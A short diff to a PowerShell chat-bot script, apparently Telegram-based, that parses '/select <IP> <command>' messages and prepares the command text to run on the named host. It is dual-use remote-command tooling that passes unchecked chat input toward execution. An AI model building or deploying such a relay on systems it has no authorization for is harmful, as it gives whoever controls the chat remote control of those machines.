@@ -660,7 +660,12 @@ While ($DoNotExit)  {
 	Switch -Wildcard ($LastMessageText)  {
 	  "/select $ipV4 *"  { #Important: run with a space
 	    #The user wants to run a command
-     		Write-Host "LastMessageText: $LastMessageText"
+     		if ($LastMessageText -match "/select (\d+\.\d+\.\d+\.\d+)") {
+		    $ipV4 = $matches[1]
+		    Write-Host "IP Address: $ipV4"
+		    $CommandToRun = $LastMessageText -replace "/select $ipV4 ", ""
+		    Write-Host "CommandToRun: $CommandToRun"
+		}
 		#$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
                 $Commands = $CommandToRun -split "`r?`n"
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
